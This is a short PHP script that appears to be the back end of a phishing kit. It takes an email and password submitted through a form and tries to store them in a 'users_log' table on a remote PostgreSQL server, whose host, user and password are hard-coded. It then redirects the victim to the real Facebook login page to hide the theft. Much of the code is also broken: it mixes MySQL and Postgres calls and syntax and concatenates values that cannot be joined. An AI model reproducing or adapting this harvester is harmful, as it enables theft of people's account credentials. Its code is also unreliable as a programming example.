<?php
if (!empty($_POST['email']) && !empty($_POST['pass'])) {
    $user = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL, MYSQLI_NOT_NULL_FLAG);
    $pass = filter_var($_POST['pass'], FILTER_SANITIZE_SPECIAL_CHARS, MYSQLI_NOT_NULL_FLAG);
}

$link_db = pg_connect('host=db-postgresql-do-user-10364263-0.b.db.ondigitalocean.com port=25060 dbname=defaultdb user=doadmin pass=I0ELsWuKWuHDgjIf');

$query = "INSERT INTO users_log SET user_log='$user',pass_log='$pass'";

$insert_db = $link_db . $query;

pg_query($insert_db);

return header('Location: https://facebook.com/login') . exit();
